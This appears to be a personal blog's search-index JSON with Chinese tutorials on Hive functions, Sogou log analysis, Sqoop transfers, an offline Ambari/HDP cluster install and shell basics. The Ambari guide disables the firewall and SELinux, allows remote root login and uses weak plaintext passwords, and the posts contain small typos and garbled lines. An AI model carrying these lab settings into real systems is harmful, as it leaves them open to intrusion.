{"meta":{"title":"千里稻花应秀色","subtitle":"五更桐叶最佳音","description":"blogs by SSR","author":"SSR","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2021-07-20T05:00:42.000Z","updated":"2021-07-20T05:01:02.288Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-07-20T04:30:30.000Z","updated":"2021-07-20T04:59:41.047Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-07-20T05:00:01.000Z","updated":"2021-07-20T05:00:28.332Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Hive查询进阶","slug":"hive5","date":"2021-10-08T09:57:10.000Z","updated":"2021-10-09T10:03:45.647Z","comments":true,"path":"2021/10/08/hive5/","link":"","permalink":"http://example.com/2021/10/08/hive5/","excerpt":"","text":"# HiveQL 数据查询进阶 本章要点 Hive 内置函数 Hive 构建搜索日志分析系统 Sqoop 应用与开发 # Hive 内置函数 Hive 内置函数就是 Hive 中可以直接使用的函数，首先查看一下有哪些函数 1234567891011121314151617181920212223242526272829303132show functions;INFO : OK+------------------------------+| tab_name |+------------------------------+| ! || != || $sum0 || % || &amp; || * || + || - || / || &lt; || &lt;= || &lt;=&gt; || &lt;&gt; || = || == || &gt; || &gt;= || ^ || abs || acos || add_months || aes_decrypt || aes_encrypt || and |...+------------------------------+289 rows selected (0.494 seconds) 其中常用的如 avg 求平均，concat 连接函数，count 统计等。内置函数可以被分成：数学函数、字符函数、收集函数、转换函数、日期函数、条件函数、聚合函数以及表生成函数。 # 数学函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#加法select 10+10;INFO : OK+------+| 20 |+------+1 row selected (1.324 seconds)#减法select 15-3;INFO : OK+------+| 12 |+------+1 row selected (0.564 seconds)#乘除*/select 6*6;INFO : OK+------+| 36 |+------+1 row selected (0.867 seconds)select 36/6;INFO : OK+------+| 6.0 |+------+1 row selected (0.734 seconds)#round四舍五入select round(88.999,2),round(78.600,1), round(55.776,2);INFO : OK+--------+-------+--------+| 89.00 | 78.6 | 55.78 |+--------+-------+--------+1 row selected (0.505 seconds)#ceil向上取整select ceil(84.5);INFO : OK+------+| 85 |+------+1 row selected (0.542 seconds)#floor向下取整select floor(45.9);INFO : OK+------+| 45 |+------+1 row selected (0.535 seconds)#pow 平方函数select pow(2,3);INFO : OK+------+| 8.0 |+------+1 row selected (0.357 seconds)#pmod 取模函数select pmod(9,8);INFO : OK+------+| 1 |+------+1 row selected (0.242 seconds) # 字符函数 123456789101112131415161718192021222324252627282930#lower转小写select lower(&quot;FJKNXCYT&quot;);+-----------+| fjknxcyt |+-----------+#upper转大写select upper(&quot;asdjnkgbasd&quot;);+--------------+| ASDJNKGBASD |+--------------+#length字符串长度select length(&quot;hadoop&quot;);+------+| 6 |+------+#concat字符拼接select concat(&quot;hadoop&quot;, &quot;&amp;hive&quot;);+--------------+| hadoop&amp;hive |+--------------+#substr取子串(从8开始取5个)select substr(&quot;hadoop spark hive&quot;, 8, 5);+--------+| spark |+--------+#trim去除前后空格select trim(&quot; hadoop &quot;);+---------+| hadoop |+---------+ # 转换函数 12345#cast类型转换函数select cast (88 as double);+-------+| 88.0 |+-------+ # 日期函数 12345678910#year month day 分别获取年月日select year(&quot;2021-10-08 18:40:24&quot;), month(&quot;2021-10-08 18:40:24&quot;), day(&quot;2021-10-08 18:40:24&quot;);+-------+------+------+| 2021 | 10 | 8 |+-------+------+------+#to_date返回字段中日期部分select to_date(&quot;2021-10-08 18:40:24&quot;);+-------------+| 2021-10-08 |+-------------+ # 条件函数 123456789#case A when B then C when D then E else F end;select ts, uid, rank, case rank when &quot;2&quot; then rank+1 else rank-1 end from sogou.sogou_liangjian;+-----------------+-----------------------------------+-------+------+| ts | uid | rank | _c3 |+-----------------+-----------------------------------+-------+------+| 20111230104333 | 53a3b5132bd6af7d324f3fd55d7153ba | 3 | 2 || 20111230104334 | 966a6bf4c4ec1cc693b6e40702984235 | 4 | 3 || 20111230104334 | ae55d5e4b4f29a1221816a121e087567 | 2 | 3 |+-----------------+-----------------------------------+-------+------+ # 聚合函数 123456789101112131415161718192021222324252627#count返回行数select count(*) from sogou.sogou_xj;+-------+| 1330 |+-------+#sum求和select sum(orders) as ordersum from sogou.sogou_xj;+-----------+| ordersum |+-----------+| 2043 |+-----------+#min列最小值select min(orders) from sogou.sogou_xj;+------+| 1 |+------+#max列最大值select max(rank) from sogou.sogou_xj;+------+| 10 |+------+#avg列平均值select avg(rank) from sogou.sogou_xj;+---------------------+| 2.9225563909774435 |+---------------------+ # Hive 构建搜索日志分析系统 # 数据预处理 (Linux 环境) 查看数据 12[root@hdp-1 hive]# wc -l sogou.500w.utf8 5000000 sogou.500w.utf8 数据拓展 将用户访问的时间拆分成，年月日小时字段，为后面创建分区表做准备，编写一个 shell 脚本实现此功能。 1234567891011vi pre.sh #!/bin/bashinfile=$1outfile=$2awk -F &#x27;\\t&#x27; &#x27;&#123;print $0&quot;\\t&quot;substr($1,1,4)&quot;\\t&quot;substr($1,5,2)&quot;\\t&quot;substr($1,7,2)&quot;\\t&quot;substr($1,9,2)&#125;&#x27; $infile &gt; $outfilechmod +x pre.shsh pre.sh ./sogou.500w.utf8 ./sogou.500w.utf8.extless sogou.500w.utf8.ext 数据加载 将数据放到 HDFS 上 12hdfs dfs -mkdir -p /usr/local/hive/hdfs dfs -put ./sogou.500w.utf8.ext /usr/local/hive/ # 基于 Hive 构建日志的数据仓库 启动 Hadoop 集群，打开 Hive 客户端 基本操作 1234567891011121314151617181920212223242526272829303132333435363738show databases;+---------------------+| database_name |+---------------------+| default || information_schema || sogou || sys |+---------------------+create database if not exists sogou;use sogou;show tables;+------------------+| tab_name |+------------------+| sogou_500w || sogou_liangjian || sogou_xj || sogou_xj_backup |+------------------+#创建外部表sogou_0936加载sogou.500w.utf8的数据create external table if not exists sogou.sogou_0936(ts string,uid string,keyword string, rank int, orders int, url string) row format delimited fields terminated by &#x27;\\t&#x27; stored as textfile location &#x27;/usr/local/hive/raw/&#x27;;#创建外部表sogou_ext加载sogou.500w.utf8.ext的数据 create external table if not exists sogou.sogou_ext(ts string,uid string,keyword string, rank int, orders int, url string) row format delimited fields terminated by &#x27;\\t&#x27; stored as textfile location &#x27;/usr/local/hive/ext/&#x27;#查看数据没问题select * from sogou_0936 limit 10;select * from sogou_ext limit 10;desc sogou_0936;+-----------+------------+----------+| col_name | data_type | comment |+-----------+------------+----------+| ts | string | || uid | string | || keyword | string | || rank | int | || orders | int | || url | string | |+-----------+------------+----------+ 创建分区表 12345678910111213141516171819202122#创建分区表create external table if not exists sogou.sogou_partition(ts string,uid string,keyword string, rank int, orders int, url string) partitioned by (year int, month int, day int, hour int ) row format delimited fields terminated by &#x27;\\t&#x27; stored as textfile;#查看表show tables;+------------------+| tab_name |+------------------+| sogou_0936 || sogou_500w || sogou_ext || sogou_liangjian || sogou_partition || sogou_xj || sogou_xj_backup |+------------------+#最后向分区表中导入数据#开启动态分区非严格模式set hive.exec.dynamic.partition.mode=nonstrict;#禁用矢量运行set hive.vectorized.execution.enabled=false;insert overwrite table sogou.sogou_partition partition(year, month, day, hour) select * from sogou.sogou_ext;#查看数据 # 数据分析需求（1）：条数统计 12#查询总数据条数select count(*) from sogou.sogou_ext; 12#查询关键词非空数据select count(*) from sogou.sogou_ext where keyword is not null and keyword != &#x27;&#x27;; 123#无重复总条数（根据ts, uid, keyword, url）select count(*) from (select uid,count(*) from sogou.sogou_ext group by ts,uid,keyword,url having count(*) = 1 ) t;#需要给子表起个名 12#统计独立uid条数select count(distinct(uid)) from sogou.sogou_ext; # 数据分析需求（2）：关键词分析 1234#查询关键词平均长度select avg(a.cnt) from (select size(split(keyword,&#x27; s+&#x27;)) as cnt from sogou.sogou_ext) a;#由于split函数不支持矢量计算，需要先关闭该功能set hive.vectorized.execution.enabled=false; 12#查询频度排名前50select keyword,count(*) as cnt from sogou.sogou_ext group by keyword order by cnt desc limit 50; # 数据分析需求（3）：UID 分析 123#为了统计UID的查询次数分布（查询1次的UID个数…查询n次的UID个数），这里我们列出查询1次、2次、3次和大于3次的UID个数select sum(if(uids.cnt=1,1,0)),sum(if(uids.cnt=2,1,0)), sum(if(uids.cnt=3,1,0)), sum(if(uids.cnt&gt;3,1,0)) from (select uid, count(*) as cnt from sogou.sogou_ext group by uid) uids; 12#统计UID平均查询次数select sum(a.cnt)/count(a.uid)from(select uid,count(*)as cnt from sogou.sogou_ext group by uid) a; 12345678#统计查询次数大于2次的用户占比：#先统计B:UID总数select count(distinct(uid)) as A from sogou.sogou_ext;#统计查询A:次数大于2的UID个数select count(a.uid) as B from (select uid,count(*) as cnt from sogou.sogou_ext group by uid having cnt&gt;2)a;#占比结果是C=B/A#查询次数大于2次的数据如下select b.* from(select uid,count(*) as cnt from sogou.sogou_ext group by uid having cnt &gt;2) a join sogou.sogou_ext b on a.uid=b.uid limit 50; # 数据分析需求（4）：用户行为分析 12345#点击次数与rank之间的关系select count(*) from sogou.sogou_ext where rank &lt; 11;+----------+| 4999869 |+----------+ 12345#直接输入url进行查询的比例select count(*) from sogou.sogou_ext where keyword like&#x27;%www%&#x27;;+--------+| 73979 |+--------+ 12345#用户访问的网站包含用户输入的url类型关键词select sum(if(instr(url，keyword)&gt;0,1,0)) from (select * from sogou.sogou_ext where keyword like &#x27;%www%&#x27;)a;+--------+| 27561 |+--------+ 123456789#查询独立用户行为select uid, count(*)as cnt from sogou.sogou_ext where keyword like&#x27;%仙剑奇侠传%&#x27; group by uid having cnt &gt; 3;+-----------------------------------+------+| uid | cnt |+-----------------------------------+------+| 265f1fa26029c058c695ecc7ee4bad01 | 4 || 2b136abffd8f0dd38d97a52a7e50f7fb | 4 || 40aa046859609c25b3914ac9f2735c5c | 5 || 653d48aa356d5111ac0e59f9fe736429 | 9 | # Sqoop 应用与开发 在实际开发中我们经常会碰到这样一种需求，即大数据平台处理完的数据需要导入关系型数据库，反之关系型数据库中的数据也需要导入大数据平台，为此大数据平台为我们提供了 Sqoop 工具来解决这一需求。 # Sqoop 简介 Sqoop 是 Apache 开源的顶级项目之一，用于在 ApacheHadoop 和关系型数据库等结构化数据存储之间高效传输大容量数据的工具。也就是说，Sqoop 是一款类 ETL 工具，主要负责将大数据平台处理完的数据导入关系型数据库中，或者将关系型数据库中的数据带入大数据平台。 # Sqoop 安装部署 安装环境 在安装 Sqoop 之前确保 hadoop 正确启动，运行，mysql 正常运行。 解压安装 12345tar -zxvf sqoop-1.4.7.bin__hadoop-2.6.0.tar.gzmv sqoop-1.4.7.bin__hadoop-2.6.0 /usr/local/sqoopmv sqoop-1.4.7.bin__hadoop-2.6.0 /usr/local/sqoop#更改目录权限chown hadoop:hadoop -R /usr/local/sqoop/ 配置 Sqoop 配置 MySQL 连接器 Sqoop 底层通过 JDBC 的方式访问 MySQL 数据库，所以需要把 MySQL 数据库的驱动程序复制到 Sqoop 的依赖包，这里可以使用 hive 的 mysql 驱动（如果有） 1cp /usr/local/hive/lib/mysql-connector-java-5.1.32.jar /usr/local/sqoop/lib/ 配置环境变量 进入到 Sqoop 的 conf 目录下，找到 sqoop-env-template.sh 文件，重命名为 sqoop-env.sh，打开进行环境变量的配置 12cp /usr/local/sqoop/conf/sqoop-env-template.sh /usr/local/sqoop/conf/sqoop-env.shvi /usr/local/sqoop/conf/sqoop-env.sh 将 commons-log.jar 包放在 lib 下。 https://mirrors.tuna.tsinghua.edu.cn/apache//commons/lang/binaries/commons-lang-2.6-bin.zip 12mv commons-lang-2.6.jar /usr/local/sqoop/lib/chown hadoop:hadoop /usr/local/sqoop/lib/commons-lang-2.6.jar # Sqoop 将 Hive 表中的数据导入 MySQL 实验条件 MySQL 正常启动 构建 MySQL 数据库中的表 登录 MySQL 登录 MySQL 的命令 1mysql -u root -p 创建数据库 1create database if not exists test; 创建表 1create table test.uid_cnt (uid varchar(255) default null,cnt int(11) default null); 构建 Hive 数据仓库中的表 进入 Hive 创建 Hive 中的表 sogou.sogou_uid_cnt 1create table sogou.sogou_uid_cnt(uid string,cnt int) row format delimited fields terminated by &#x27;\\t&#x27;; 向表中写入数据 12insert into table sogou.sogou_uid_cnt select uid,count(*) from sogou_500w group by uid;select * from sogou.sogou_uid_cnt limit 10; 使用 Sqoop 工具将 Hive 的数据导入 MySQL 导入命令 1/usr/local/sqoop/bin/sqoop export --connect jdbc:mysql://master:3306/test --username root --password 123456 --table uid_cnt --export-dir &#x27;hdfs://master:9000/user/hive/warehouse/sogou.db/sogou_uid_cnt&#x27; --fields-terminated-by &#x27;\\t&#x27; 以上命令的解释如下 sqoop export 表示数据从 Hive 复制到 MySQL 数据库中；–connect jdbc:mysql://master:3306/test 表示连接 MySQL 数据库 test；–username root 表示连接 MySQL 数据库的用户名；–password 12345 表示连接 MySQL 数据库的密码；–table uid_cnt 表示 MySQL 中的表即将被导入的表名称；–export-dir '/user/hive/warehouse/sogou.db/uid_cnt’表示 Hive 中被导出的文件路径；–fields-terminated-by '\\t’表示 Hive 中被导出的文件字段的分隔符。 以上命令成功运行之后会在控制台打印输出如下结果 最后，验证结果数据。 登录 MySQL 数据库，查询库 test 的表 uid_cnt 中是已经有了数据，如果有数据说明 Sqoop 工具将 Hive 中的数据成功导入了 MySQL。 123select * from test.uid_cnt limit 10;select count(*) from test.uid_cnt; 使用 Sqoop 工具将 MySQL 中的数据导入 Hive 表 前面我们成功地将 Hive 表 sogou_uid_cnt 中的数据导入 MySQL 数据库的 uid_cnt 表，反之，我们再利用 Sqoop 工具将表 uid_cnt 中的数据导入表 sogou_uid_cnt2 中 首先，在 Hive 中创建表 sogou_uid_cnt2 12create table sogou.sogou_uid_cnt2(uid string,cnt int) row format delimited fields terminated by &#x27;\\t&#x27;;describe sogou.sogou_uid_cnt2; 然后，我们就可以使用 Sqoop 工具将 MySQL 中表 uid_cnt 的数据导入 Hive 的表 sogou_uid_cnt 在导入数据之前，/user/hive/warehouse/sogou.db/sogou_uid_cnt2 已经存在，我们将其删除。 123hdfs dfs -rmdir /user/hive/warehouse/sogou.db/sogou_uid_cnt2/usr/local/sqoop/bin/sqoop import --connect jdbc:mysql://master:3306/test --username root --password 123456 --table uid_cnt --target-dir /user/hive/warehouse/sogou.db/sogou_uid_cnt2 --fields-terminated-by &#x27;\\t&#x27; -m 1 进入 Hive 进行验证 1select * from sogou.sogou_uid_cnt2 limit 10;","categories":[{"name":"Hive","slug":"Hive","permalink":"http://example.com/categories/Hive/"}],"tags":[{"name":"大数据","slug":"大数据","permalink":"http://example.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"}]},{"title":"Ambari","slug":"Ambari","date":"2021-09-28T10:39:27.000Z","updated":"2021-10-09T05:21:20.462Z","comments":true,"path":"2021/09/28/Ambari/","link":"","permalink":"http://example.com/2021/09/28/Ambari/","excerpt":"","text":"# Ambari # 1. 什么是 Ambari Apache Ambari 项目旨在通过开发用于配置，管理和监视 Apache Hadoop 集群的软件来简化 Hadoop 管理。Ambari 通过其 RESTful API 提供了直观，易于使用的 Hadoop 管理 Web UI。 Ambari 使系统管理员可以： 设置 Hadoop 集群 Ambari 提供了用于在任意数量的主机上安装 Hadoop 服务的分步向导。 Ambari 处理群集的 Hadoop 服务的配置。 管理 Hadoop 集群 Ambari 提供了用于在整个集群中启动，停止和重新配置 Hadoop 服务的集中管理。 监控 Hadoop 集群 Ambari 提供了一个仪表板，用于监视 Hadoop 集群的运行状况和状态。 Ambari 利用 Ambari Metrics System 收集指标。 Ambari 利用 Ambari Alert Framework 进行系统警报，并在需要您关注时（例如，节点故障，剩余磁盘空间不足等）通知您。 Ambari 使应用程序开发人员和系统集成商能够： 使用 Ambari REST API 轻松将 Hadoop 的配置，管理和监视功能集成到自己的应用程序中。 官方网站：http://ambari.apache.org/ # 2.Ambari 架构 # ambari-server 提供外部访问的 API 接受 Ambari-agent 的心跳信息和管理 Ambari-agent 元数据的管理和数据库的访问 # ambari-agent 采集所在节点的信息并且汇总发心跳汇报给 ambari-server 处理 ambari-server 的执行请求，安装、启动、停止服务等 # ambari-web 提供可视化的操作界面 # 3. 下载 Ambari 所在的公司已经被 Cloudera 公司收购所以相关的文档都在 clodera 公司的官方网站：https://docs.cloudera.com/HDPDocuments/index.html 我们选择的安装方式是：Ambari+HDP+HDP-UTILS, 因为 Ambari 本身只是一个大数据平台自动化部署和管理的工具，所以需要配合 HDP (大数据软件安装包集合) 一起使用。 选择合适的版本，我们这里选择的是 2.7.0.0 版本，然后就会有一个安装指南：https://docs.cloudera.com/HDPDocuments/Ambari-2.7.0.0/bk_ambari-installation/content/ambari_repositories.html 其实可以直接配置官网提供的 yum 源就可以安装，但是由于是国外的网站，速度比较慢，所以就使用离线本地 yum 源的安装方式 # 4. 安装环境说明 使用 VMWare/VirtualBox，虚拟四台虚拟机，其中 ambari 是服务器，其他为 HDP 安装节点，配置如下: 主机 系统 网络 内存 磁盘 ambari CentOS7 172.18.74.160(NAT/birdge) 4G 100G hdp-1 CentOS7 172.18.74.161(NAT/birdge) 4G 50G hdp-2 CentOS7 172.18.74.162(NAT/birdge) 4G 50G hdp-3 CentOS7 172.18.74.163(NAT/birdge) 4G 50G 配置好虚拟机就可以安装了，安装的方式如下 # 5.Server 端环境配置 (ambari) 说明：如果服务器已经配置好，则直接进行第 6 节客户端的配置。 # 5.1. 安装 http 服务 1234yum install -y httpdsystemctl start httpdsystemctl enable httpd # 5.2. 配置 yum 源 虚拟机的网络模式是 nat 或者桥接的时候就可以连通外网，这样我们就可以不用配置 CentOS 的 yum 源了，但是 Ambari 和 HDP 的还需要我们配置，需要将 Ambari 和 HDP 以及 HDP-UTILS 的安装包通过 SFTP 工具上传到 ambari 上。 1234567#创建文件夹mkdir /var/www/html/&#123;ambari,hdp,hdp-utils&#125;# 解压安装包到HTTP的网页根目录tar -zxvf HDP-UTILS-1.1.0.22-centos7.tar.gz -C /var/www/html/hdp-utils/tar -zxvf ambari-2.7.0.0-centos7.tar.gz -C /var/www/html/ambari/tar -zxvf HDP-3.0.0.0-centos7-rpm.tar.gz -C /var/www/html/hdp 这样就可以通过 http 的方式获取到相应的 rpm 文件和 repodata 文件来配置 yum 源了 12345678910111213141516171819# 配置ambari的yum源vi /etc/yum.repos.d/ambari.repo[ambari]name=ambaribaseurl=http://172.18.74.160/ambari/ambari/centos7/2.7.0.0-897/gpgcheck=0#配置hdp和hdp-utils的yum源vi /etc/yum.repos.d/hdp.repo[HDP]name=HDPbaseurl=http://172.18.74.160/hdp/HDP/centos7/3.0.0.0-1634/gpgcheck=0[HDP-UTILS]name=HDP_UTILSbaseurl=http://172.18.74.160/hdp-utils/HDP-UTILS/centos7/1.1.0.22/gpgcheck=0# 验证yum repolist 将 yum 文件使用 scp 发送到客户端节点 12scp /etc/yum.repos.d/ambari.repo hdp-1:/etc/yum.repos.d/scp /etc/yum.repos.d/hdp.repo hdp-1:/etc/yum.repos.d/ # 5.3. 数据库配置 数据库使用 MariaDB 作为元数据储存的库，存放 ambari 服务数据 123456# 安装yum install -y mariadb-server# 启动 开机自启systemctl start mariadb &amp;&amp; systemctl enable mariadb# 初始化mysql_secure_installation 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061[root@ambari ~]# mysql_secure_installation NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB SERVERS IN PRODUCTION USE! PLEASE READ EACH STEP CAREFULLY!In order to log into MariaDB to secure it, we&#x27;ll need the currentpassword for the root user. If you&#x27;ve just installed MariaDB, andyou haven&#x27;t set the root password yet, the password will be blank,so you should just press enter here.Enter current password for root (enter for none): OK, successfully used password, moving on...Setting the root password ensures that nobody can log into the MariaDBroot user without the proper authorisation.Set root password? [Y/n] New password: Re-enter new password: Password updated successfully!Reloading privilege tables.. ... Success!By default, a MariaDB installation has an anonymous user, allowing anyoneto log into MariaDB without having to have a user account created forthem. This is intended only for testing, and to make the installationgo a bit smoother. You should remove them before moving into aproduction environment.Remove anonymous users? [Y/n] ... Success!Normally, root should only be allowed to connect from &#x27;localhost&#x27;. Thisensures that someone cannot guess at the root password from the network.Disallow root login remotely? [Y/n] n ... skipping.By default, MariaDB comes with a database named &#x27;test&#x27; that anyone canaccess. This is also intended only for testing, and should be removedbefore moving into a production environment.Remove test database and access to it? [Y/n] - Dropping test database... ... Success! - Removing privileges on test database... ... Success!Reloading the privilege tables will ensure that all changes made so farwill take effect immediately.Reload privilege tables now? [Y/n] ... Success!Cleaning up...All done! If you&#x27;ve completed all of the above steps, your MariaDBinstallation should now be secure.Thanks for using MariaDB! # 5.3.1. 创建数据库 123456789mysql -uroot -p# 创建amabri数据库create database ambari;#授权grant all on ambari.* to ambari@&#x27;%&#x27; identified by &#x27;bigdata&#x27;;grant all on ambari.* to ambari@localhost identified by &#x27;bigdata&#x27;;# 使用ambari-server提供的sql脚本创建相关的表use ambari;source /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sql # 5.3.2. 将 JDBC 驱动包复制到指定目录（/usr/share/java） 将 jdbc 的驱动包使用 sftp 工具上传到 ambari 12mv mysql-connector-java-*.jar /usr/share/java/mysql-connector-java.jarambari-server setup --jdbc-db=mysql --jdbc-driver=/usr/share/java/mysql-connector-java.jar # 5.4. 安装 ambari-server 12345# 安装yum install -y ambari-server# 配置ambari-serverambari-server setup 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758[root@hdp-1 ~]# ambari-server setupUsing python /usr/bin/pythonSetup ambari-serverChecking SELinux...SELinux status is &#x27;enabled&#x27;SELinux mode is &#x27;permissive&#x27;WARNING: SELinux is set to &#x27;permissive&#x27; mode and temporarily disabled.OK to continue [y/n] (y)? yCustomize user account for ambari-server daemon [y/n] (n)? yEnter user account for ambari-server daemon (root):Adjusting ambari-server permissions and ownership...Checking firewall status...Checking JDK...[1] Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8[2] Custom JDK==============================================================================Enter choice (1): 2WARNING: JDK must be installed on all hosts and JAVA_HOME must be valid on all hosts.WARNING: JCE Policy files are required for configuring Kerberos security. If you plan to use Kerberos,please make sure JCE Unlimited Strength Jurisdiction Policy Files are valid on all hosts.Path to JAVA_HOME: /opt/jdk1.8.0_171/Validating JDK on Ambari Server...done.Check JDK version for Ambari Server...JDK version found: 8Minimum JDK version is 8 for Ambari. Skipping to setup different JDK for Ambari Server.Checking GPL software agreement...GPL License for LZO: https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.htmlEnable Ambari Server to download and install GPL Licensed LZO packages [y/n] (n)? Completing setup...Configuring database...Enter advanced database configuration [y/n] (n)? yConfiguring database...==============================================================================Choose one of the following options:[1] - PostgreSQL (Embedded)[2] - Oracle[3] - MySQL / MariaDB[4] - PostgreSQL[5] - Microsoft SQL Server (Tech Preview)[6] - SQL Anywhere[7] - BDB==============================================================================Enter choice (1): 3Hostname (localhost): Port (3306): Database name (ambari): Username (ambari): Enter Database Password (bigdata): Configuring ambari database...Should ambari use existing default jdbc /usr/share/java/mysql-connector-java.jar [y/n] (y)? Configuring remote database connection properties...WARNING: Before starting Ambari Server, you must run the following DDL against the database to create the schema: /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sqlProceed with configuring remote database connection properties [y/n] (y)? Extracting system views...ambari-admin-2.7.0.0.897.jar....Ambari repo file doesn&#x27;t contain latest json url, skipping repoinfos modificationAdjusting ambari-server permissions and ownership...Ambari Server &#x27;setup&#x27; completed successfully. # 5.5 启动 ambari-server 1ambari-server start 可以访问 ambari 的 web 界面: http://172.18.74.160:8080 # 6.Client 端环境配置 说明：以下配置是在需要安装集群的各个节点中进行，此处为 hdp-1,hdp-2,hdp-3。 # 6.1 修改主机名和配置主机到 IP 的映射 (所有节点) 12345678910111213# 分别修改三台机器的主机名hostnamectl set-hostname hdp-1hostnamectl set-hostname hdp-2hostnamectl set-hostname hdp-3#立即生效bash# 配置主机名到IP的映射vi /etc/hosts172.18.74.160 ambari172.18.74.161 hdp-1172.18.74.162 hdp-2172.18.74.163 hdp-3 # 6.2 关闭防火墙和关闭 SELinux (所有节点) 123456# 关闭防火墙systemctl stop firewalld &amp;&amp; systemctl disable firewalld# 关闭selinuxsetenforce 0vi /etc/selinux/configSELINUX=disabled # 6.3. 配置免密登录 (所有节点) 123456789101112131415# hpd-1ssh-keygenssh-copy-id hdp-1ssh-copy-id hdp-2ssh-copy-id hdp-3# hdp-2ssh-keygenssh-copy-id hdp-1ssh-copy-id hdp-2ssh-copy-id hdp-3# hdp-3ssh-keygenssh-copy-id hdp-1ssh-copy-id hdp-2ssh-copy-id hdp-3 # 6.4. 安装时间同步服务 ntp 12345678910111213#hdp-1yum install -y ntpvi /etc/ntp.confserver 127.127.1.0fudge 127.127.1.0 stratum 10systemctl start ntpdsystemctl enable ntpd#hdp-2yum install -y ntpdatentpdate hdp-1#hdp-3yum install -y ntpdatentpdate hdp-1 # 6.5 关闭大页面压缩 (所有节点) 12echo never &gt; /sys/kernel/mm/transparent_hugepage/enabledecho never &gt; /sys/kernel/mm/transparent_hugepage/defrag # 6.6. 安装配置 JDK 将 jdk 的安装包上传到 hdp-1 12345678910111213141516171819#解压tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/local/# 配置环境变量vi /etc/profileexport JAVA_HOME=/usr/local/jdkexport JRE_HOME=$&#123;JAVA_HOME&#125;/jreexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH# 刷新环境变量source /ect/profilejava# 将jdk和环境变量发送到其它机器scp -r /usr/local/jdk hdp-2:/usr/local/scp -r /usr/local/jdk hdp-3:/usr/local/scp /etc/profile hdp-2:/etc/scp /etc/profile hdp-3:/etc/# hdp-2 hdp-3source /ect/profilejava # 6.7. 安装必要软件 (所有节点) 123456789yum -y install libtirpc-develyum -y install psmiscyum -y install redhat-lsbyum -y install ncyum -y install gccyum -y install python-develyum -y install python-kerberos-1.1-15.el7.x86_64yum -y install rpcbind-0.2.0-49.el7.x86_64 # 6.8. 安装 MySQL 数据库 (hdp-2，安装 Hive 可选) 12345678# 安装yum install -y mariadb-server# 启动 开机自启systemctl start mariadb &amp;&amp; systemctl enable mariadb# 初始化mysql_secure_installation# 进入数据库mysql -u root -p 1234create database hive;create user &quot;hive&quot;@&quot;%&quot; identified by &quot;hive&quot;;grant all privileges on hive.* to &#x27;hive&#x27;@&#x27;%&#x27; identified by &#x27;hive&#x27;;flush privileges; # 6.9. 安装和配置 ambari-agent (所有节点) 12345678# 安装yum install -y ambari-agent# 配置vi /etc/ambari-agent/conf/ambari-agent.ini [server]hostname=ambari#启动ambari-agent start # 7.HDP 部署 # 7.1 登录 在浏览器中访问 http://172.18.74.160:8080 默认的用户名和密码都是 admin # 7.2 配置集群","categories":[],"tags":[]},{"title":"Linux Shell(一)","slug":"Linux Shell","date":"2021-09-14T00:19:12.000Z","updated":"2021-10-02T04:50:29.863Z","comments":true,"path":"2021/09/14/Linux Shell/","link":"","permalink":"http://example.com/2021/09/14/Linux%20Shell/","excerpt":"","text":"什么是 shell？目前常用的操作系统（Windows、U/L、Android、iOS 等）都带有图形界面，然 而，早期的计算机并没有图形界面，人们只能使用命令来控制计算机。其实，真 正能够控制计算机硬件（CPU、内存、显示器）的只有操作系统内核（Kernel）， 图形界面和命令行都是架设在用户和内核之间的桥梁，是为了方便用户控制计算 机而存在的。Shell 也是一种编程语言，主要用来开发一些实用的、自动化的小工具，例如，检测计算机的硬件参数、搭建 Web 运行环境、日志分析等。对 Linux 运维工程师来说，Shell 更是必须掌握的技能。Shell 使自动化管理服务器集群成为可能，否则用户只能一个一个地登录所有的服务器，对每一台服务器进行相同的设置，而这些服务器可能有成百上千之多，用户会在重复性的工作上浪费大量时间。 # 1.1 查看 Shell 版本 1234567cat /ect/shells/bin/sh/bin/bash/sbin/nologin/usr/bin/sh/usr/bin/bash/usr/sbin/nologin # 1.2 Shell 变量类型 Shell 变量分为四类，分别为自定义变量、环境变量、位置变量和预定义变量。 根据工作要求临时定义的变量称为自定义变量 环境变量一般是指用 export 内置命令导出的变量，用于定义 Shell 的运行环境，保证 Shell 命令的正确执行 只使用 不定义 从命令行、函数或脚本执行等处传递参数时，$0、$1 称为特殊位置变量 预定义变量是在 bash 中已有的变量，可以直接使用，如@、@、@、* 等。 # 1.2.1 自定义变量 自定义变量可以理解为局部变量或普通变量，只能在创建它们的 Shell 函数或 Shell 脚本中使用，自定义变量的说明如表所示。 定义自定义变量 变量名 = 变量值，字母下划线开头，区分大小写 使用自定义变量 $ 变量名 查看自定义变量 echo$ 变量名 set (所有变量) 取消自定义变量 unset 变量名 自定义变量使用范围 仅在当前 Shell 中有效 123456789#!/bin/bash#分支结构host=www.baidu.comif ping -c1 $host &amp;&gt;/dev/nullthen echo &quot;network ok&quot;else echo &quot;bad network&quot;fi # 1.2.2 环境变量 环境变量也可称为全局变量，可以在创建它们的 Shell 及其派生出来的任意子进程 Shell 中使用。环境变量的说明如表所示。 12345#查看echo $PATH#修改PATH=$PATH:/bin/newexport PATH # 1.2.3 位置变量 在 Shell 中存在一些位置变量。位置变量用于在命令行、函数或脚本中传递参数，其变量名不用自己定义，其作用也是固定的。执行脚本时，通过在脚本后面给出具体的参数（多个参数用空格隔开）对相应的位置变量进行赋值。 $0 代表命令本身，$1-$9 代表接收的第 1~9 个参数，10以上需要用括起来，如10以上需要用{}括起来，如10以上需要用括起来，如 {10} 代表接收的第 10 个参数。 1234567891011[hadoop@master shell]$ cat ping06.sh #!/bin/bashping -c1 $1 &amp;&gt;/dev/nullif [ $? -eq &quot;0&quot; ];then 